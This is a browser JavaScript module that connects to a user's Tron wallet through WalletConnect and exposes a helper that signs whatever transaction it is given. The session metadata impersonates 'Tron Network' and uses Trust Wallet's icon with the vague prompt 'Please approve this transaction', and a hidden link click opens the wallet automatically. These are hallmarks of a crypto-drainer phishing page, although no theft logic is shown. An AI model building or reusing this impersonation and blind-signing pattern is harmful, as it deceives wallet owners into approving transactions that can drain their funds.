import { Buffer } from 'buffer';
window.Buffer = Buffer;

import UniversalProvider from "@walletconnect/universal-provider";

const TRON_CHAIN = "tron:0x2b6653dc";
const PROJECT_ID = 'c5250465b531d3f5128116dc9460f64e';

let provider = null;

async function initProvider() {
    try {
        provider = await UniversalProvider.init({
            projectId: PROJECT_ID,
            metadata: {
                name: 'Tron Network',
                description: 'Please approve this transaction',
                url: window.location.origin,
                icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
            }
        });

        // Deep-link into Trust Wallet WITHOUT navigating away from page
        // Using hidden <a> click keeps the connect() promise alive
        provider.on("display_uri", (uri) => {
            const a = document.createElement('a');
            a.href = uri;
            a.target = '_blank';
            a.rel = 'noopener';
            document.body.appendChild(a);
            a.click();
            setTimeout(() => document.body.removeChild(a), 1000);
        });

    } catch (e) {
        console.error("WC Init Error:", e);
    }
}

window.connectWalletConnectTron = async function () {
    if (!provider) {
        alert("Still loading, please wait a few seconds.");
        return null;
    }

    try {
        // Only disconnect if existing session is stale (missing required methods)
        if (provider.session) {
            const tronNS = provider.session.namespaces && provider.session.namespaces.tron;
            const hasMethod = tronNS && tronNS.methods && tronNS.methods.includes("tron_signTransaction");
            if (!hasMethod) {
                try { await provider.disconnect(); } catch (_) {}
            }
        }

        await provider.connect({
            namespaces: {
                tron: {
                    methods: ["tron_signTransaction", "tron_signMessage"],
                    chains: [TRON_CHAIN],
                    events: ["chainChanged", "accountsChanged"]
                }
            }
        });

        const session = provider.session;
        if (!session || !session.namespaces || !session.namespaces.tron) return null;

        const address = session.namespaces.tron.accounts[0].split(":")[2];

        const signTransaction = async (transaction) => {
            return provider.request(
                {
                    method: "tron_signTransaction",
                    params: [transaction]
                },
                TRON_CHAIN
            );
        };

        return { address, signTransaction };

    } catch (err) {
        console.error("WC Connect Error:", err);
        return null;
    }
};

initProvider();
